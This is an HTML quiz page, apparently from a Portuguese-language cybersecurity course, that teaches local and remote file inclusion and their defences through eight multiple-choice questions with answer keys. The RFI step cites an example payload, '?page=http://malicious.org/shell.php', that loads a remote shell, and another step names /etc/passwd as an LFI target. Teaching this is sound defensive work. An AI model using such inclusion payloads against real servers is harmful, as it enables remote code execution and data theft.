<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CyberDuo - Inclusão de Arquivos 6.11</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --cyber-blue: #00f2ff;
            --cyber-green: #00ff41;
            --cyber-red: #ff003c;
            --cyber-yellow: #ffb800;
            --bg-dark: #05070a;
            --card-dark: #0d1117;
        }

        html, body { height: 100%; height: 100dvh; margin: 0; padding: 0; overflow: hidden; }
        body { background-color: var(--bg-dark); color: #e6edf3; font-family: 'Inter', sans-serif; display: flex; flex-direction: column; touch-action: manipulation; }

        .game-header { flex-shrink: 0; padding: 0.8rem 1rem; display: flex; align-items: center; gap: 0.8rem; background: #0d1117; border-bottom: 1px solid rgba(0, 242, 255, 0.2); z-index: 60; }
        .progress-container { flex-grow: 1; height: 8px; background: #1f2937; border-radius: 10px; overflow: hidden; }
        .progress-fill { height: 100%; background: var(--cyber-blue); width: 0%; transition: width 0.4s ease; }
        .hearts { display: flex; gap: 0.3rem; color: var(--cyber-red); min-width: 100px; justify-content: flex-end; }

        .game-content { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; align-items: center; padding: 0.8rem; width: 100%; max-width: 600px; margin: 0 auto; box-sizing: border-box; scrollbar-width: none; }
        .game-content::-webkit-scrollbar { display: none; }

        .fixation-card { background: #0d1117; border: 1px solid var(--cyber-blue); padding: clamp(1rem, 4vw, 1.3rem); border-radius: 1.2rem; width: 100%; box-sizing: border-box; margin-top: auto; margin-bottom: auto; animation: slideUp 0.3s ease-out; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: flex; flex-direction: column; gap: 0.3rem; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .concept-icon { font-size: 1.8rem; margin-bottom: 0.2rem; display: block; }
        .concept-text { font-size: 1.05rem; color: var(--cyber-blue); font-weight: 800; text-transform: uppercase; margin-bottom: 0.1rem; }
        .concept-desc { color: #b1bac4; font-size: 0.95rem; line-height: 1.4; text-align: left; margin-bottom: 0.8rem; border-left: 3px solid var(--cyber-blue); padding-left: 0.8rem; }

        .highlight-cyan { color: #00f2ff; font-weight: 700; }
        .highlight-yellow { color: var(--cyber-yellow); font-weight: 700; }
        .highlight-red { color: var(--cyber-red); font-weight: 700; }
        .highlight-green { color: var(--cyber-green); font-weight: 700; }

        .question-title { font-size: 1.05rem; font-weight: 800; margin-bottom: 0.8rem; line-height: 1.4; color: white; padding-top: 0.8rem; border-top: 1px solid #1f2937; text-align: left; }

        .options-grid { display: grid; gap: 0.4rem; width: 100%; text-align: left; }
        .option-card { background: #161b22; border: 1px solid #30363d; border-bottom-width: 3px; padding: 0.7rem; border-radius: 0.8rem; cursor: pointer; transition: all 0.1s; display: flex; align-items: center; gap: 0.6rem; font-weight: 600; font-size: 0.95rem; -webkit-tap-highlight-color: transparent; }
        .option-card.selected { border-color: var(--cyber-blue); background: rgba(0, 242, 255, 0.05); }
        .option-card.correct { border-color: var(--cyber-green) !important; background: rgba(0, 255, 65, 0.1) !important; color: var(--cyber-green); }
        .option-card.wrong { border-color: var(--cyber-red) !important; background: rgba(255, 0, 60, 0.1) !important; color: var(--cyber-red); }

        .game-footer { flex-shrink: 0; padding: 1rem; background: #0d1117; border-top: 1px solid #1f2937; width: 100%; display: flex; justify-content: center; box-sizing: border-box; z-index: 50; }
        .check-btn { width: 100%; max-width: 400px; padding: 0.9rem; border-radius: 0.8rem; font-weight: 800; text-transform: uppercase; cursor: pointer; background: #1f2937; color: #4b5563; border: none; font-size: 0.9rem; letter-spacing: 1px; }
        .check-btn.active { background: var(--cyber-blue); color: black; box-shadow: 0 4px 0 #0099a1; }

        .feedback-overlay { position: fixed; bottom: -100%; left: 0; right: 0; padding: 1.5rem; transition: bottom 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); z-index: 100; border-top-left-radius: 1.5rem; border-top-right-radius: 1.5rem; display: flex; flex-direction: column; align-items: center; text-align: center; }
        .feedback-overlay.show { bottom: 0; }
        .feedback-overlay.correct { background: #0d1a10; border-top: 3px solid var(--cyber-green); }
        .feedback-overlay.wrong { background: #1a0d0d; border-top: 3px solid var(--cyber-red); }
        .feedback-title { font-size: 1.1rem; font-weight: 800; margin-bottom: 0.3rem; }
        .feedback-msg { font-size: 0.95rem; color: #8b949e; line-height: 1.4; }
    </style>
</head>
<body>

    <div class="game-header">
        <i class="fas fa-times cursor-pointer text-gray-500" onclick="window.location.href='../modules/modulo-06.html'"></i>
        <div class="progress-container"><div class="progress-fill" id="progressFill"></div></div>
        <div class="hearts" id="heartsContainer"></div>
    </div>

    <main class="game-content" id="gameArea"></main>

    <div id="feedbackPopup" class="feedback-overlay">
        <div class="feedback-title" id="fbTitle"></div>
        <div class="feedback-msg" id="fbMsg"></div>
        <button class="check-btn active w-full mt-4" onclick="handleContinue()">Continuar</button>
    </div>

    <footer class="game-footer" id="footerArea">
        <button class="check-btn" id="checkBtn" disabled onclick="checkResponse()">Verificar</button>
    </footer>

    <script>
        const phases = [
            {
                icon: 'fa-file-import',
                concept: 'File Inclusion',
                desc: 'Vulnerabilidades de <span class="highlight-cyan">Inclusão de Arquivos</span> ocorrem quando um app permite que o usuário controle quais arquivos são carregados ou executados pelo servidor.',
                task: 'O que define uma vulnerabilidade de File Inclusion na Web?',
                options: [
                    'Permitir que a entrada do usuário dite o arquivo processado pelo aplicativo',
                    'Aumentar o limite de tamanho de download de imagens públicas do site',
                    'Reduzir a velocidade de upload de arquivos PDF para o servidor de e-mail'
                ],
                correctText: 'Permitir que a entrada do usuário dite o arquivo processado pelo aplicativo',
                explanation: 'A falta de validação permite que o atacante "peça" arquivos sensíveis ou maliciosos.'
            },
            {
                icon: 'fa-house-lock',
                concept: 'Local File Inclusion (LFI)',
                desc: 'No <span class="highlight-yellow">LFI</span>, o atacante acessa arquivos que já existem no servidor local, como o arquivo <span class="highlight-red">/etc/passwd</span> no Linux.',
                task: 'Qual o risco principal de uma exploração LFI bem-sucedida?',
                options: [
                    'Leitura de arquivos de sistema e execução de comandos locais',
                    'Alteração da cor de fundo de todos os navegadores da rede local',
                    'Criptografia de todos os e-mails recebidos pela organização alvo'
                ],
                correctText: 'Leitura de arquivos de sistema e execução de comandos locais',
                explanation: 'LFI pode expor segredos, códigos-fonte e chaves de configuração do host.'
            },
            {
                icon: 'fa-cloud-arrow-down',
                concept: 'Remote File Inclusion (RFI)',
                desc: 'No <span class="highlight-red">RFI</span>, o agressor induz o servidor a carregar e rodar código de um servidor externo (ex: ?page=http://malicious.org/shell.php).',
                task: 'O que diferencia o RFI do LFI em termos de origem do arquivo?',
                options: [
                    'O RFI carrega código de um servidor externo controlado pelo atacante',
                    'O RFI acontece via rádio e o LFI acontece via cabo Ethernet blindado',
                    'Não há diferença técnica entre os dois tipos de vulnerabilidades'
                ],
                correctText: 'O RFI carrega código de um servidor externo controlado pelo atacante',
                explanation: 'O RFI permite a Execução Remota de Código (RCE) de forma trivial e perigosa.'
            },
            {
                icon: 'fa-microchip',
                concept: 'Tempos de Execução',
                desc: 'Aplicativos que usam <span class="highlight-cyan">scripts dinâmicos</span> (como PHP) são mais suscetíveis, pois funções de inclusão aceitam URLs e caminhos de arquivos.',
                task: 'Por que linguagens como PHP são alvos comuns para ataques de inclusão?',
                options: [
                    'Porque possuem funções de inclusão que aceitam entradas dinâmicas sem validação',
                    'Porque PHP é o único protocolo que permite o uso de caracteres especiais',
                    'Porque o código PHP é salvo na memória RAM física do monitor do usuário'
                ],
                correctText: 'Porque possuem funções de inclusão que aceitam entradas dinâmicas sem validação',
                explanation: 'Funções como "include" e "require" são vetores clássicos se não houver sanitização.'
            },
            {
                icon: 'fa-upload',
                concept: 'Perigo no Upload',
                desc: 'Formulários que permitem <span class="highlight-yellow">upload de arquivos</span> sem validação de tipo ou execução podem permitir que atacantes subam "shells" maliciosas.',
                task: 'Qual a recomendação de segurança para sistemas que permitem upload de arquivos?',
                options: [
                    'Validar o tipo de arquivo e armazená-lo fora do diretório raiz da web',
                    'Permitir apenas uploads de arquivos com extensão .exe e .sh para backup',
                    'Ocultar a barra de progresso do upload para visitantes que não estão logados'
                ],
                correctText: 'Validar o tipo de arquivo e armazená-lo fora do diretório raiz da web',
                explanation: 'Impedir que o servidor web execute o arquivo subido é a defesa vital.'
            },
            {
                icon: 'fa-user-lock',
                concept: 'Menor Privilégio',
                desc: 'Rodar o servidor web com <span class="highlight-red">privilégios de root</span> é catastrófico em caso de LFI, permitindo acesso total ao sistema de arquivos.',
                task: 'Como o privilégio da aplicação afeta o impacto de uma falha de inclusão?',
                options: [
                    'Se o app rodar com privilégios altos, o atacante ganha controle total do host',
                    'Se o app rodar com poucos privilégios, o site demora mais para carregar',
                    'Privilégios baixos impedem que atacantes consigam ver a página web'
                ],
                correctText: 'Se o app rodar com privilégios altos, o atacante ganha controle total do host',
                explanation: 'O atacante herda as permissões do processo que executa o servidor web.'
            },
            {
                icon: 'fa-shield-halved',
                concept: 'Defesa com Allow-lists',
                desc: 'A melhor defesa é implementar <span class="highlight-green">listas de permissão fixas</span> de arquivos válidos, nunca aceitando o nome do arquivo direto da entrada do usuário.',
                task: 'Qual a técnica de mitigação mais robusta contra ataques de inclusão de arquivos?',
                options: [
                    'Uso de allow-lists estáticas para definir quais arquivos podem ser incluídos',
                    'Remover permanentemente o teclado do servidor web de produção',
                    'Trocar a cor da interface de administração do servidor a cada semana'
                ],
                correctText: 'Uso de allow-lists estáticas para definir quais arquivos podem ser incluídos',
                explanation: 'Remover a escolha do arquivo das mãos do usuário elimina o vetor de ataque.'
            },
            {
                icon: 'fa-check-double',
                concept: 'Resumo de Inclusão',
                desc: 'Garantir que usuários só acessem o que é <span class="highlight-green">necessário para sua função</span> é o pilar para mitigar falhas de vazamento de arquivos.',
                task: 'Qual a regra básica para acesso a arquivos em um servidor seguro?',
                options: [
                    'Não permitir acesso a nenhum arquivo além dos necessários para a função do usuário',
                    'Dar permissão de leitura para todos os arquivos na pasta /etc do Linux',
                    'Desativar o log de erros do servidor para ocultar tentativas de invasão'
                ],
                correctText: 'Não permitir acesso a nenhum arquivo além dos necessários para a função do usuário',
                explanation: 'O isolamento e o controle de acesso previnem que pequenas falhas virem grandes brechas.'
            }
        ];

        let currentStep = 0;
        let selectedIdx = null;
        let hearts = 5;
        let shuffledOptions = [];

        function shuffle(array) {
            let currentIndex = array.length, randomIndex;
            while (currentIndex != 0) {
                randomIndex = Math.floor(Math.random() * currentIndex);
                currentIndex--;
                [array[currentIndex], array[randomIndex]] = [array[randomIndex], array[currentIndex]];
            }
            return array;
        }

        function render() {
            if (currentStep >= phases.length) { showVictory(); return; }
            const step = phases[currentStep];
            const area = document.getElementById('gameArea');
            const checkBtn = document.getElementById('checkBtn');
            const progress = (currentStep / phases.length) * 100;
            
            document.getElementById('progressFill').style.width = `${progress}%`;
            selectedIdx = null;
            checkBtn.disabled = true;
            checkBtn.classList.remove('active');
            updateHearts();

            shuffledOptions = shuffle([...step.options]);

            area.innerHTML = `
                <div class="fixation-card">
                    <i class="fas ${step.icon} concept-icon" style="color: var(--cyber-blue)"></i>
                    <div class="text-[0.6rem] font-black uppercase tracking-widest mb-1" style="color: var(--cyber-blue)">6.11 • INCLUSÃO DE ARQUIVOS • Nível ${currentStep + 1}</div>
                    <div class="concept-text">${step.concept}</div>
                    <div class="concept-desc">${step.desc}</div>
                    <div class="question-title">${step.task}</div>
                    <div class="options-grid">
                        ${shuffledOptions.map((opt, i) => `
                            <div class="option-card" onclick="select(${i})">
                                <div class="w-5 h-5 border border-gray-600 rounded-full flex items-center justify-center text-[9px] font-bold">${i+1}</div>
                                <span>${opt}</span>
                            </div>
                        `).join('')}
                    </div>
                </div>
            `;
            area.scrollTop = 0;
        }

        function select(idx) {
            selectedIdx = idx;
            document.querySelectorAll('.option-card').forEach((c, i) => c.classList.toggle('selected', i === idx));
            document.getElementById('checkBtn').disabled = false;
            document.getElementById('checkBtn').classList.add('active');
        }

        function checkResponse() {
            const step = phases[currentStep];
            const isCorrect = shuffledOptions[selectedIdx] === step.correctText;
            const popup = document.getElementById('feedbackPopup');
            
            document.querySelectorAll('.option-card').forEach((c, i) => {
                if (shuffledOptions[i] === step.correctText) c.classList.add('correct');
                else if (i === selectedIdx) c.classList.add('wrong');
                c.classList.add('disabled', 'pointer-events-none');
            });

            if (isCorrect) {
                document.getElementById('fbTitle').innerText = "ARQUIVO VALIDADO!";
                document.getElementById('fbTitle').className = "text-green-500 font-bold";
                document.getElementById('fbMsg').innerText = step.explanation;
                popup.className = "feedback-overlay show correct";
            } else {
                hearts--;
                updateHearts();
                document.getElementById('fbTitle').innerText = "INCLUSÃO MALICIOSA!";
                document.getElementById('fbTitle').className = "text-red-500 font-bold";
                document.getElementById('fbMsg').innerText = "O correto era: " + step.correctText;
                popup.className = "feedback-overlay show wrong";
                if (hearts <= 0) setTimeout(() => { alert("ACESSO NEGADO. Reiniciando!"); location.reload(); }, 500);
            }
        }

        function handleContinue() {
            document.getElementById('feedbackPopup').classList.remove('show');
            currentStep++;
            render();
        }

        function updateHearts() {
            const container = document.getElementById('heartsContainer');
            container.innerHTML = Array(5).fill(0).map((_, i) => `<i class="${i < hearts ? 'fas' : 'far'} fa-heart"></i>`).join('');
        }

        function showVictory() {
            document.getElementById('progressFill').style.width = `100%`;
            document.getElementById('footerArea').classList.add('hidden');
            document.getElementById('gameArea').innerHTML = `
                <div class="fixation-card text-center items-center flex flex-col" style="border-color: var(--cyber-green)">
                    <i class="fas fa-medal text-5xl text-yellow-400 mb-2"></i>
                    <h2 class="text-xl font-bold text-white mb-1">TRILHA DE INCLUSÃO CONCLUÍDA!</h2>
                    <p class="text-[0.7rem] text-gray-400 mb-4">Você compreendeu exaustivamente as diferenças e riscos de LFI e RFI no Módulo 6.11.</p>
                    <button class="check-btn active w-full" onclick="window.location.href='../modules/modulo-06.html'" style="background: var(--cyber-green); color: black;">VOLTAR AO MÓDULO</button>
                </div>
            `;
        }

        render();
    </script>
</body>
</html>
